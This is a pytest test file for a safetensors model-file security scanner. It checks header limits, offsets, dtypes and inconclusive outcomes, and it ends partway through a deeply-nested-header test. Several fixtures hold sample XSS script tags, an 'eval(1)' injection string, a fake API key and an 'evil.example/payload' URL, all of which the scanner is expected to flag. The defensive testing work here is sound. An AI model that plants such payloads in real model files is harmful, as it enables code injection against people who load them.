import builtins
import json
import os
import struct
from pathlib import Path
from types import TracebackType
from typing import Any, BinaryIO

import numpy as np
import pytest

# Skip if safetensors is not available before importing it
pytest.importorskip("safetensors")

from safetensors import SafetensorError, safe_open
from safetensors.numpy import load_file, save_file

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.safetensors_scanner import SAFETENSORS_READ_INCONCLUSIVE_REASON, SafeTensorsScanner


def create_safetensors_file(path: Path) -> None:
    data: dict[str, np.ndarray] = {
        "t1": np.arange(10, dtype=np.float32),
        "t2": np.ones((2, 2), dtype=np.int64),
    }
    save_file(data, str(path))


def create_safetensors_with_dtype_size_mismatch(path: Path, dtype: str) -> None:
    write_raw_safetensors(
        path,
        {"tensor": {"dtype": dtype, "shape": [4], "data_offsets": [0, 1]}},
        b"\x00",
    )


def write_raw_safetensors(path: Path, header: dict[str, Any], data: bytes) -> None:
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + data)


def write_raw_safetensors_header(path: Path, header_bytes: bytes, data: bytes = b"") -> None:
    path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + data)


def write_sparse_safetensors(path: Path, header: dict[str, Any], data_size: int) -> None:
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", len(header_bytes)))
        handle.write(header_bytes)
        handle.truncate(8 + len(header_bytes) + data_size)


def test_valid_safetensors_file(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is True
    assert not result.has_errors
    assert result.metadata.get("tensor_count") == 2
    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "passed"


@pytest.mark.parametrize(
    ("dtype", "shape", "data_size"),
    [
        ("C64", [2], 16),
        ("F4", [2], 1),
        ("F6_E2M3", [4], 3),
        ("F6_E3M2", [4], 3),
        ("F8_E4M3FNUZ", [4], 4),
        ("F8_E5M2FNUZ", [4], 4),
        ("F8_E8M0", [4], 4),
    ],
)
def test_valid_current_safetensors_dtype(
    tmp_path: Path,
    dtype: str,
    shape: list[int],
    data_size: int,
) -> None:
    file_path = tmp_path / f"valid-{dtype}.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {
                "dtype": dtype,
                "shape": shape,
                "data_offsets": [0, data_size],
            },
        },
        b"\x00" * data_size,
    )

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert direct.success is True
    assert direct.issues == []
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.status == CheckStatus.PASSED
        and check.details.get("size") == data_size
        for check in direct.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_valid_empty_tensor_offsets(tmp_path: Path) -> None:
    file_path = tmp_path / "empty_tensor.safetensors"
    save_file(
        {
            "empty": np.empty((0,), dtype=np.float32),
            "value": np.ones((1,), dtype=np.float32),
        },
        str(file_path),
    )

    with file_path.open("rb") as handle:
        header_len = struct.unpack("<Q", handle.read(8))[0]
        header = json.loads(handle.read(header_len))

    assert header["empty"]["data_offsets"][0] == header["empty"]["data_offsets"][1]
    assert load_file(str(file_path))["empty"].shape == (0,)

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert not result.has_errors
    assert any(
        check.name == "Tensor Offset Validation"
        and check.details.get("tensor") == "empty"
        and check.status == CheckStatus.PASSED
        for check in result.checks
    )
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.details.get("tensor") == "empty"
        and check.details.get("size") == 0
        and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_zero_length_offsets_require_empty_shape(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_zero_length_tensor.safetensors"
    write_raw_safetensors(
        file_path,
        {"not_empty": {"dtype": "F32", "shape": [1], "data_offsets": [0, 0]}},
        b"",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.details.get("tensor") == "not_empty"
        and check.details.get("expected_size") == 4
        and check.details.get("actual_size") == 0
        and check.severity == IssueSeverity.CRITICAL
        and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_empty_tensor_offset_sort_matches_safetensors(tmp_path: Path) -> None:
    file_path = tmp_path / "empty_tensor_before_nonempty_range.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "nonempty": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "empty": {"dtype": "U8", "shape": [0], "data_offsets": [0, 0]},
        },
        b"\x00",
    )

    with safe_open(str(file_path), framework="np") as handle:
        assert set(handle.keys()) == {"empty", "nonempty"}

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(
        check.status == CheckStatus.FAILED and check.name == "Offset Continuity Check" for check in result.checks
    )


@pytest.mark.parametrize(
    ("dtype", "shape"),
    [
        ("U8", [1 << (8 * struct.calcsize("P") - 1), 2, 0]),
        ("U16", [1 << (8 * struct.calcsize("P") - 1)]),
        ("U8", [1 << (8 * struct.calcsize("P")), 0]),
    ],
)
def test_shape_size_overflow_cannot_be_masked_by_zero_dimension(
    tmp_path: Path,
    dtype: str,
    shape: list[int],
) -> None:
    file_path = tmp_path / "overflow_masked_empty_tensor.safetensors"
    write_raw_safetensors(
        file_path,
        {"tensor": {"dtype": dtype, "shape": shape, "data_offsets": [0, 0]}},
        b"",
    )

    with pytest.raises(SafetensorError, match=r"(?i)(overflow|invalid.*(?:header|json))"):
        safe_open(str(file_path), framework="np")

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Tensor Size Computation Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("shape") == shape
        for check in result.checks
    )


def test_zero_before_large_dimensions_remains_valid_empty_shape(tmp_path: Path) -> None:
    file_path = tmp_path / "zero_first_large_empty_tensor.safetensors"
    shape = [0, 1 << (8 * struct.calcsize("P") - 1), 2]
    write_raw_safetensors(
        file_path,
        {
            "tensor": {
                "dtype": "U8",
                "shape": shape,
                "data_offsets": [0, 0],
            }
        },
        b"",
    )

    with safe_open(str(file_path), framework="np") as handle:
        assert handle.get_slice("tensor").get_shape() == shape

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME


def test_tensor_size_overflow_uses_native_byte_width(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner._MAX_PLATFORM_USIZE", 15)

    assert SafeTensorsScanner._expected_size("U8", [15]) == 15
    assert SafeTensorsScanner._expected_size("U8", [16]) is None
    assert SafeTensorsScanner._expected_size("U16", [7]) == 14
    assert SafeTensorsScanner._expected_size("U16", [8]) is None


def test_offsets_must_fit_native_usize(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "native_offset_overflow.safetensors"
    write_raw_safetensors(
        file_path,
        {"empty": {"dtype": "U8", "shape": [0], "data_offsets": [4, 4]}},
        b"\x00" * 4,
    )
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner._MAX_PLATFORM_USIZE", 3)

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert any(
        check.name == "Tensor Offset Validation"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("max_platform_offset") == 3
        for check in result.checks
    )


def test_valid_empty_safetensors_custom_metadata(tmp_path: Path) -> None:
    """An empty string-to-string map is valid custom metadata."""
    file_path = tmp_path / "empty_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata["custom_metadata_valid"] is True
    assert result.metadata["custom_metadata_entry_count"] == 0
    assert result.metadata["custom_metadata_security_flags"] == []
    assert any(
        check.name == "SafeTensors Metadata Structure Validation" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "custom_metadata",
    [None, "not-a-map", ["not-a-map"], {"owner": 7}],
    ids=["null", "string", "list", "non-string-value"],
)
def test_malformed_safetensors_custom_metadata_is_inconclusive(tmp_path: Path, custom_metadata: Any) -> None:
    """SafeTensors custom metadata must be a string-to-string map."""
    file_path = tmp_path / "malformed_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": custom_metadata,
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["custom_metadata_valid"] is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "SafeTensors Metadata Structure Validation" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("custom_metadata", "expected_flags", "expected_check"),
    [
        (
            "<script>alert(1)</script>",
            ["suspicious_pattern", "xss_html_injection"],
            "SafeTensors XSS/HTML Injection Detection",
        ),
        (
            {"api_key": "SECRET_METADATA_TOKEN", "owner": 7},
            ["credential_exposure"],
            "SafeTensors Embedded Credentials Detection",
        ),
        (["eval(1)"], ["code_injection"], "SafeTensors Code Injection Detection"),
        (["https://evil.example/payload"], ["suspicious_pattern"], "Metadata Pattern Check"),
    ],
)
def test_malformed_safetensors_custom_metadata_still_reports_security_flags(
    tmp_path: Path,
    custom_metadata: Any,
    expected_flags: list[str],
    expected_check: str,
) -> None:
    """Malformed metadata should not bypass content detections."""
    file_path = tmp_path / "malformed_malicious_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": custom_metadata,
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["custom_metadata_valid"] is False
    assert result.metadata["custom_metadata_security_flags"] == expected_flags
    assert any(check.name == expected_check and check.status == CheckStatus.FAILED for check in result.checks)


def test_large_safetensors_scans_header_without_default_full_file_cap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    data_size = DEFAULT_MAX_FILE_READ_SIZE + 4096
    file_path = tmp_path / "large_model.safetensors"
    write_sparse_safetensors(
        file_path,
        {"weights": {"dtype": "U8", "shape": [data_size], "data_offsets": [0, data_size]}},
        data_size,
    )

    scanner = SafeTensorsScanner()
    monkeypatch.setattr(
        scanner,
        "calculate_file_hashes",
        lambda _path: {"md5": "0", "sha256": "0", "sha512": "0"},
    )

    result = scanner.scan(str(file_path))

    checks = {check.name: check for check in result.checks}
    assert checks["Header Length Validation"].status == CheckStatus.PASSED
    assert "File Size Limit" not in checks
    assert result.success is True
    assert result.metadata["file_size"] > DEFAULT_MAX_FILE_READ_SIZE


def _write_oversized_header_safetensors(path: Path, header_len: int) -> None:
    header_obj = {
        "__metadata__": {"safe": "value"},
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    header_prefix = json.dumps(header_obj, separators=(",", ":")).encode("utf-8")
    assert len(header_prefix) < header_len

    with open(path, "wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(header_prefix)

        remaining = header_len - len(header_prefix)
        chunk_size = 1024 * 1024
        for _ in range(remaining // chunk_size):
            handle.write(b" " * chunk_size)
        if remaining % chunk_size:
            handle.write(b" " * (remaining % chunk_size))

        handle.write(b"\x00\x00\x00\x00")


def test_oversized_header_returns_operational_exit2(tmp_path: Path) -> None:
    file_path = tmp_path / "oversized_header.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    result = scan_model_directory_or_file(str(file_path), max_safetensors_header_bytes=max_header_bytes)

    assert result.success is False
    assert determine_exit_code(result) == 2
    limit_check = next(check for check in result.checks if check.name == "Header Size Limit")
    assert limit_check.severity == IssueSeverity.INFO


def test_oversized_header_triggers_limit_check(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "oversized_header.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    monkeypatch.setattr(
        scanner,
        "calculate_file_hashes",
        lambda _path: pytest.fail("oversized SafeTensors headers must be rejected before hashing"),
    )
    result = scanner.scan(str(file_path))

    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"
    assert all(check.name != "File Integrity Hash" for check in result.checks)
    assert "exceeds maximum allowed size" in header_limit_check.message
    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_size_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    assert result.bytes_scanned == file_path.stat().st_size


def test_oversized_header_skips_metadata_content_analysis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "oversized_skip_analysis.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    analyze_called = {"value": False}

    def track_analyze(metadata: dict[str, object], result: object, path: str) -> None:
        analyze_called["value"] = True

    monkeypatch.setattr(scanner, "_analyze_metadata_content", track_analyze)

    result = scanner.scan(str(file_path))

    assert analyze_called["value"] is False
    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.success is False


def test_oversized_header_does_not_read_beyond_configured_limit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    file_path = tmp_path / "oversized_guarded_read.safetensors"
    max_header_bytes = 8 * 1024 * 1024
    oversized_header_len = max_header_bytes + 1
    _write_oversized_header_safetensors(file_path, header_len=oversized_header_len)

    original_open: Any = builtins.open

    class GuardedReader:
        def __init__(self, handle: BinaryIO) -> None:
            self._handle = handle
            self._total_read = 0

        def read(self, size: int = -1) -> bytes:
            if size > max_header_bytes:
                raise AssertionError(f"scanner attempted oversized read: {size}")
            chunk = self._handle.read(size)
            self._total_read += len(chunk)
            if self._total_read > 8:
                raise AssertionError(f"scanner read past the 8-byte header length field: {self._total_read}")
            return chunk

        def __enter__(self) -> "GuardedReader":
            self._handle.__enter__()
            return self

        def __exit__(
            self,
            exc_type: type[BaseException] | None,
            exc: BaseException | None,
            tb: TracebackType | None,
        ) -> Any:
            return self._handle.__exit__(exc_type, exc, tb)

        def __getattr__(self, name: str) -> Any:
            return getattr(self._handle, name)

    def guarded_open(
        file: str | os.PathLike[str] | int,
        mode: str = "r",
        *args: Any,
        **kwargs: Any,
    ) -> Any:
        handle = original_open(file, mode, *args, **kwargs)
        if isinstance(file, (str, os.PathLike)) and Path(file) == file_path and "rb" in mode:
            return GuardedReader(handle)
        return handle

    monkeypatch.setattr(builtins, "open", guarded_open)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    result = scanner.scan(str(file_path))

    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"


def test_corrupted_header(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    corrupt_path = tmp_path / "corrupt.safetensors"
    with open(file_path, "rb") as f:
        data = bytearray(f.read())

    header_len = struct.unpack("<Q", data[:8])[0]
    header = data[8 : 8 + header_len]
    corrupt_header = header[:-10]  # truncate more to break JSON
    new_len = struct.pack("<Q", len(corrupt_header))
    corrupt_path.write_bytes(new_len + corrupt_header + data[8 + header_len :])

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(corrupt_path))

    # Scanner may report corrupted header via has_errors or via issues/checks
    assert result.has_errors or len(result.issues) > 0 or len(result.checks) > 0
    # Check for JSON or header errors in issues or checks
    all_messages = [issue.message.lower() for issue in result.issues]
    all_messages.extend([check.message.lower() for check in result.checks])
    assert any("json" in msg or "header" in msg or "invalid" in msg or "corrupt" in msg for msg in all_messages)


def test_non_object_header_is_inconclusive_not_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "array_header.safetensors"
    write_raw_safetensors_header(file_path, b"[]")

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
    assert direct.has_errors is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Header Format Validation" and check.status == CheckStatus.FAILED for check in direct.checks
    )
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)


def test_invalid_utf8_header_is_inconclusive_not_scanner_crash(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_utf8_header.safetensors"
    write_raw_safetensors_header(file_path, b"{\xff}")

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
    assert direct.has_errors is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(check.name == "SafeTensors JSON Parse" and check.status == CheckStatus.FAILED for check in direct.checks)
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)


def test_unavailable_read_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "unreadable.safetensors"
    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated SafeTensors read failure")

    def raise_detection_error(_path: str) -> str:
        raise OSError("simulated SafeTensors detection read failure")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_detection_error)
    monkeypatch.setattr("modelaudit.core.detect_file_format_from_magic", lambda _path: "unknown")
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner.open", raise_os_error, raising=False)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "SafeTensors File Read"]
    assert direct.success is False
    assert aggregate.success is False
    assert len(read_checks) == 1
    assert read_checks[0].status == CheckStatus.FAILED
    assert "Unable to read SafeTensors file" in read_checks[0].message
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    metadata = aggregate.file_metadata[str(file_path)]
    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in metadata["scan_outcome_reasons"]
    assert metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert any(
        check.name == "SafeTensors File Read" and "Unable to read SafeTensors file" in check.message
        for check in aggregate.checks
    )
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "permission-denied.safetensors"
    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    assert direct.metadata["scan_outcome_reasons"] == [SAFETENSORS_READ_INCONCLUSIVE_REASON]
    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert aggregate.file_metadata[str(file_path)]["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_bad_offsets(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    bad_path = tmp_path / "bad_offsets.safetensors"
    with open(file_path, "rb") as f:
        header_len = struct.unpack("<Q", f.read(8))[0]
        header_bytes = f.read(header_len)
        rest = f.read()

    header = json.loads(header_bytes.decode("utf-8"))
    first = next(k for k in header if k != "__metadata__")
    header[first]["data_offsets"] = [0, 2]  # incorrect
    new_header_bytes = json.dumps(header).encode("utf-8")
    new_len = struct.pack("<Q", len(new_header_bytes))
    bad_path.write_bytes(new_len + new_header_bytes + rest)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(bad_path))

    assert result.has_errors
    assert any("offset" in issue.message.lower() for issue in result.issues)


def test_unclaimed_safetensors_data_is_inconclusive_not_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "trailing.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        check.name == "Tensor Data Coverage Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_unclaimed_safetensors_data_returns_exit2(tmp_path: Path) -> None:
    file_path = tmp_path / "trailing.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    result = scan_model_directory_or_file(str(file_path))

    assert determine_exit_code(result) == 2
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_malformed_data_offsets_are_inconclusive_not_scanner_crash(tmp_path: Path) -> None:
    file_path = tmp_path / "bad_offsets_shape.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4, 8]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Tensor Offset Structure Validation" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert not any("Error scanning SafeTensors file" in issue.message for issue in result.issues)


def test_safetensors_security_finding_takes_precedence_over_inconclusive_structure(tmp_path: Path) -> None:
    file_path = tmp_path / "malicious_metadata_trailing.safetensors"
    header = {
        "__metadata__": {"description": "<script>alert('xss')</script>"},
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.has_errors is True
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert determine_exit_code(aggregate) == 1


def test_safetensors_with_torch7_like_metadata_keeps_safetensors_routing(tmp_path: Path) -> None:
    file_path = tmp_path / "torch-marker-metadata.safetensors"
    header = {
        "__metadata__": {
            "framework": "torch",
            "kind": "tensor nn.Sequential",
            "description": "<script>alert('xss')</script>",
        },
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    write_raw_safetensors(file_path, header, b"\x00" * 4)

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert determine_exit_code(aggregate) == 1


def test_zlib_shaped_header_keeps_safetensors_security_routing(tmp_path: Path) -> None:
    file_path = tmp_path / "zlib-shaped-header.unknown"
    header_len = 0x9C78
    header = json.dumps(
        {
            "__metadata__": {"description": "<script>alert('xss')</script>"},
            "tensor": {
                "dtype": "U8",
                "shape": [1],
                "data_offsets": [0, 1],
            },
        },
        separators=(",", ":"),
    ).encode("utf-8")
    write_raw_safetensors_header(file_path, header + b" " * (header_len - len(header)), b"\x00")

    result = scan_file(str(file_path))

    assert file_path.read_bytes()[:2] == b"\x78\x9c"
    assert result.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_zlib_shaped_deep_header_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "deep-zlib-shaped.unknown"
    header_len = 0x9C78
    depth = 10_000
    header = b'{"a":' + (b"[" * depth) + b"0" + (b"]" * depth) + b"}"
    write_raw_safetensors_header(file_path, header + b" " * (header_len - len(header)), b"\x00")

    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(file_path), config=config)
        repeated_result = scan_file(str(file_path), config=config)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    parse_check = next(check for check in result.checks if check.name == "SafeTensors JSON Parse")
    assert file_path.read_bytes()[:2] == b"\x78\x9c"
    assert result.scanner_name == "safetensors"
    assert result.success is False
    assert repeated_result.success is False
    assert parse_check.status == CheckStatus.FAILED
    assert parse_check.details["exception_type"] == "RecursionError"
    assert "maximum recursion depth exceeded" in parse_check.message
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    ("dtype", "expected_size"),
    [
        ("BOOL", 4),
        ("BF16", 8),
        ("C64", 32),
        ("F4", 2),
        ("F6_E2M3", 3),
        ("F6_E3M2", 3),
        ("F8_E4M3", 4),
        ("F8_E4M3FNUZ", 4),
        ("F8_E5M2", 4),
        ("F8_E5M2FNUZ", 4),
        ("F8_E8M0", 4),
        ("F16", 8),
        ("F32", 16),
        ("F64", 32),
    ],
)
def test_tensor_size_check_runs_for_supported_dtypes(tmp_path: Path, dtype: str, expected_size: int) -> None:
    file_path = tmp_path / f"mismatch_{dtype}.safetensors"
    create_safetensors_with_dtype_size_mismatch(file_path, dtype)

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    size_checks = [
        check
        for check in direct.checks
        if check.name == "Tensor Size Consistency Check" and check.details.get("tensor") == "tensor"
    ]
    assert direct.scanner_name == "safetensors"
    assert direct.has_errors is True
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert size_checks, f"Expected Tensor Size Consistency Check for dtype {dtype}"
    assert any(
        check.status == CheckStatus.FAILED and check.details.get("expected_size") == expected_size
        for check in size_checks
    ), f"Expected failing size consistency check for dtype {dtype}"
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("dtype", ["F4", "F6_E2M3", "F6_E3M2"])
def test_subbyte_dtype_requires_byte_aligned_tensor(tmp_path: Path, dtype: str) -> None:
    file_path = tmp_path / f"misaligned-{dtype}.safetensors"
    write_raw_safetensors(
        file_path,
        {"tensor": {"dtype": dtype, "shape": [1], "data_offsets": [0, 1]}},
        b"\x00",
    )

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Tensor Size Computation Check" and check.status == CheckStatus.FAILED for check in direct.checks
    )
    assert determine_exit_code(aggregate) == 2


def test_deeply_nested_header(tmp_path: Path) -> None:
    """Ensure deeply nested headers are handled gracefully."""
    import sys

    # Create a deeply nested structure that will definitely trigger RecursionError
    # Use a much larger depth to ensure we exceed recursion limits across Python versions
    # Some Python versions/implementations have higher limits or optimizations
    base_limit = sys.getrecursionlimit()
    depth = max(base_limit * 2, 3000)  # Use at least 3000 or 2x the limit

    # Build the deeply nested JSON string manually
